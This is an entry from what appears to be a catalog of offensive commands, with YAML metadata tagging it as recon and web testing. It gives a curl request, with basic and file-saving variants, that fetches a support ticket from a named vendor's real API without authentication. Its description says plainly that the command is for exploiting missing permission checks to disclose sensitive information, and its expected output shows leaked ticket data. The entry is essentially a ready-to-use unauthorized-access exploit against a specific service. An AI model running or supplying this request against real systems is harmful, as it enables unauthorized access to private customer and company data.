---
id: cmd-uuid-456
data: >-
  curl -X GET "https://connect.8x8.com/api/v2/support/requests/12345" -H
  "Accept: application/json" -v
tags:
  - recon
  - web-testing
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:56.736Z'
verified: false
validated: true
submitted: true
---
# curl-api-access-test

## Command

```bash
curl -X GET "https://connect.8x8.com/api/v2/support/requests/12345" -H "Accept: application/json" -v
```

## Description

This command tests for unauthorized access to the 8x8 support API by sending a GET request to retrieve ticket details without authentication. Use it to exploit missing permission checks and disclose sensitive information.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method as GET | Yes |
| URL | The target endpoint with ticket number (replace 12345) | Yes |
| `-H "Accept: application/json"` | Requests JSON response format | Yes |
| `-v` | Verbose mode to show headers and status | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://connect.8x8.com/api/v2/support/requests/12345" -H "Accept: application/json"
```

### Advanced Usage

```bash
curl -X GET "https://connect.8x8.com/api/v2/support/requests/12345" -H "Accept: application/json" -v -o response.json
```

This saves the output to a file for analysis.

## Expected Output

A successful run returns HTTP 200 with JSON containing ticket data, e.g., {"id":12345, "agent":"Internal Agent Name", "details":"Sensitive info"}. Verbose mode shows headers confirming no auth was needed.

## Related

- [[Related Procedure|procedures/Exploit-Missing-Access-Controls-in-Support-API]]
